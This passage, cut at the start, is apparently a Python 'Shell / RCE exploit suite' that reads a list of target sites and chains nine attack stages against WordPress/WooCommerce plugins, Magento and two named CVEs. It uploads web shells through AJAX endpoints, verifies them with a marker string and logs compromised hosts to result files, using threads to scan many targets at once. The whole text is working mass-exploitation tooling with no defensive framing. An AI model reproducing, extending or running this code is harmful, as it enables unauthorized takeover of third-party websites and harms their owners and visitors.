                ur = session.post(target_ajax, data=data, files=files, timeout=timeout, verify=False)
                jr = ur.json()
                atts = (jr.get("data") or {}).get("attachments_img_html") or []
                html_att = " ".join(str(x) for x in atts)
                sm = re.search(r'src=["\']([^"\']+)["\']', html_att)
                if sm:
                    shell_url = sm.group(1)
                    try:
                        vr = session.get(shell_url, timeout=timeout, verify=False)
                        if vr.status_code == 200 and "YkzerShellOK" in vr.text:
                            safe_write_result(result_file, f"{base} | shell_verified | {shell_url}")
                            safe_write_result("vulnurls.txt", base)
                            return True
                    except Exception:
                        pass
                    safe_write_result(result_file, f"{base} | shell_uploaded | {shell_url}")
                    safe_write_result("vulnurls.txt", base)
                    return True
            except Exception:
                pass
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# MAIN ORCHESTRATION
# ============================================================================

def prompt_user_config() -> None:
    print("\n" + "=" * 80)
    print("  SHELL / RCE EXPLOIT SUITE - CONFIGURATION")
    print("=" * 80 + "\n")
    target_input = input(f"Target file [list.txt]: ").strip() or "list.txt"
    GLOBAL_CONFIG["targets_file"] = target_input
    try:
        threads_input = int(input(f"Threads [10]: ").strip() or "10")
        GLOBAL_CONFIG["threads"] = max(1, min(threads_input, 100))
    except ValueError:
        GLOBAL_CONFIG["threads"] = 10
    try:
        timeout_input = int(input(f"Timeout in seconds [30]: ").strip() or "30")
        GLOBAL_CONFIG["timeout"] = max(5, timeout_input)
    except ValueError:
        GLOBAL_CONFIG["timeout"] = 30
    print("\n" + "=" * 80)
    print(f"  Targets:   {GLOBAL_CONFIG['targets_file']}")
    print(f"  Threads:   {GLOBAL_CONFIG['threads']}")
    print(f"  Timeout:   {GLOBAL_CONFIG['timeout']}s")
    print(f"  Shell URL: {GLOBAL_CONFIG.get('shell_url', 'N/A')}")
    print("=" * 80 + "\n")


def execute_all_stages() -> List[Dict]:
    stages = [
        ("YayMail",           run_yaymail),
        ("WooCPay",           run_woocpay),
        ("Magento",           run_magento),
        ("WK WooCom",         run_wk_woocommerce),
        ("WC Designer Pro",   run_wc_designer_pro),
        ("BePlus Import",     run_beplus_import),
        ("CVE-2025-13390",    run_cve_2025_13390),
        ("WP Reset Auto",     run_wp_reset_auto_upload),
        ("CVE-2025-29009",    run_cve_2025_29009),
    ]

    targets = GLOBAL_CONFIG["targets"]
    workers = GLOBAL_CONFIG["threads"]
    timeout = GLOBAL_CONFIG["timeout"]

    stage_stats: Dict[str, Dict[str, int]] = {}
    for name, _ in stages:
        stage_stats[name] = {"success": 0, "failed": 0, "total": 0}
    stats_lock = threading.Lock()

    log_info("MAIN", f"Parallel mode: {len(targets)} targets, {workers} workers, {len(stages)} stages")
    log_info("MAIN", f"{'='*80}")

    completed = 0
    total_targets = len(targets)

    def process_target(target: str) -> None:
        nonlocal completed
        base = normalize_url(target)
        try:
            requests.head(base, timeout=5, verify=False)
        except Exception:
            with stats_lock:
                completed += 1
            log_err("CHAIN", f"[{completed}/{total_targets}] {base} -> DEAD — skipped")
            return

        for stage_label, stage_func in stages:
            result = stage_func([base], 1, timeout)
            with stats_lock:
                stage_stats[stage_label]["total"] += 1
                stage_stats[stage_label]["success"] += result["success"]
                stage_stats[stage_label]["failed"] += result["failed"]
            if result["success"] > 0:
                with stats_lock:
                    completed += 1
                log_ok("CHAIN", f"[{completed}/{total_targets}] {base} -> {stage_label}: HIT")
                return

        with stats_lock:
            completed += 1
        log_err("CHAIN", f"[{completed}/{total_targets}] {base} -> all {len(stages)} missed")

    with ThreadPoolExecutor(max_workers=workers) as executor:
        list(executor.map(process_target, targets))

    all_results = []
    for stage_label, _ in stages:
        stats = stage_stats[stage_label]
        all_results.append({"stage": stage_label, "total": stats["total"], "success": stats["success"], "failed": stats["failed"]})
    return all_results


def print_summary(all_results: List[Dict]) -> None:
    print("\n" + "=" * 80)
    print("  SHELL / RCE FINAL SUMMARY")
    print("=" * 80 + "\n")
    total_targets = 0
    total_success = 0
    total_failed = 0
    print(f"{'Stage':<20} {'Total':<8} {'Success':<10} {'Failed':<10} {'Rate':<10}")
    print("-" * 80)
    for result in all_results:
        stage = result.get("stage", "Unknown")
        total = result.get("total", 0)
        success = result.get("success", 0)
        failed = result.get("failed", 0)
        total_targets += total
        total_success += success
        total_failed += failed
        rate = f"{(success/total*100):.1f}%" if total > 0 else "0%"
        print(f"{stage:<20} {total:<8} {success:<10} {failed:<10} {rate:<10}")
    print("-" * 80)
    grand_rate = f"{(total_success/total_targets*100):.1f}%" if total_targets > 0 else "0%"
    print(f"{'TOTAL':<20} {total_targets:<8} {total_success:<10} {total_failed:<10} {grand_rate:<10}")
    print("=" * 80 + "\n")


def main() -> int:
    print("\n")
    print("╔" + "=" * 78 + "╗")
    print("║" + "  SHELL / RCE EXPLOIT SUITE — 9 STAGES".center(78) + "║")
    print("║" + "  Parallel Targets • Per-Target Chain • Stop-on-first-hit".center(78) + "║")
    print("╚" + "=" * 78 + "╝")
    print()

    prompt_user_config()
    log_info("INIT", f"Loading targets from {GLOBAL_CONFIG['targets_file']}...")
    targets = load_targets(GLOBAL_CONFIG["targets_file"])
    if not targets:
        log_err("INIT", f"No targets loaded from {GLOBAL_CONFIG['targets_file']}")
        return 1
    GLOBAL_CONFIG["targets"] = targets
    log_ok("INIT", f"Loaded {len(targets)} targets")

    log_info("INIT", "Beginning per-target chain execution...\n")
    all_results = execute_all_stages()
    print_summary(all_results)

    print("Result files generated:")
    result_files = [
        "yaymail_results.txt", "woocpay_results.txt", "magento_shells.txt",
        "wk_woocommerce_results.txt", "wc_designer_pro_results.txt",
        "beplus_import_shells.txt", "cve_2025_13390_results.txt",
        "wp_reset_auto_upload_results.txt", "cve_2025_29009_results.txt",
    ]
    for rf in result_files:
        if os.path.exists(rf):
            print(f"  ✓ {rf}")
    print("\n✓ Shell/RCE suite execution completed")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n[!] Execution interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)